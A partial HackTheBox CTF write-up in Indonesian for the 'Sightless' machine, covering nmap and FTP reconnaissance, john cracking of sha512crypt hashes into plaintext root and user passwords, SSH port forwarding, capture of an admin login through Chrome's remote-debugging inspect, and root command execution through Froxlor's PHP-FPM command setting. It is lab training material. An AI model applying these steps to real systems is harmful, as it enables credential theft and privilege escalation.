---
title: HackTheBox - Sightless
description: Write-up Sightless dari HackTheBox
author: kizuko
date: 2024-10-31 10:55:00 +0700
tags:
  - hackthebox
  - easy
  - tunneling
  - web
  - froxlor
  - john
image: 
categories:
  - HackTheBox
  - Machines
---
## Reconnaissance
### NMAP
```zsh
# Nmap 7.95 scan initiated Mon Sep  9 08:59:05 2024 as: nmap -sCV -T4 -oN nmap.txt 10.10.11.32
Nmap scan report for 10.10.11.32
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=9/9%Time=66DE5685%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Serv
SF:er\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20try\
SF:x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20be
SF:ing\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  9 09:00:33 2024 -- 1 IP address (1 host up) scanned in 87.55 seconds
```
### FTP
```zsh
❯ ftp 10.10.11.32
Connected to 10.10.11.32.
220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
Name (10.10.11.32:kizuko): anonymous
550 SSL/TLS required on the control channel
ftp: Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
221 Goodbye.
```
### HTTP
Sebelum menuju ke port 80 dibrowser alangkah baiknya tambahkan dulu `sightless.htb` di `/etc/hosts` agar bisa diakses. Setelah itu melihat-lihat, ada sebuah button/section yang menuju ke `sqlpad.sightless.htb`, kita tidak bisa mengaksesnya secara langsung, jadi kita harus menambahkan lagi di `/etc/hosts`.
![[Pasted image 20241031111224.png]]

```shell
❯ john pw -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
[archlinux:126003] shmem: mmap: an error occurred while determining whether or not /tmp/ompi.archlinux.1000/jf.0/1239875584/shared_mem_cuda_pool.archlinux could be created.
[archlinux:126003] create_and_attach: unable to create shared memory BTL coordinating structure :: size 134217728 
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blindside        (root)
insaneclownposse (michael)
2g 0:00:00:33 DONE (2024-10-31 08:20) 0.05970g/s 1757p/s 2949c/s 2949C/s kokokoko..blueboy1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

## Privesc
```shell
Forward all ports to ur machine
ssh -L 8080:127.0.0.1:8080 michael@10.10.11.32
ssh -L anyport:127.0.0.1:anyport michael@10.10.11.32

# use chrome, go to chrome://inspect and add all ports
# inspect the admin >> go to network >> wait until admin login and stop it >> view in payload and got the user and pass
# go to the froxlor web and login. go to php tab >> php-fpm >> create new php-ver >> add short desc and change the command like 'cp /root/root.txt /tmp/root.txt' 'chmod +r /tmp/root.txt' or something
```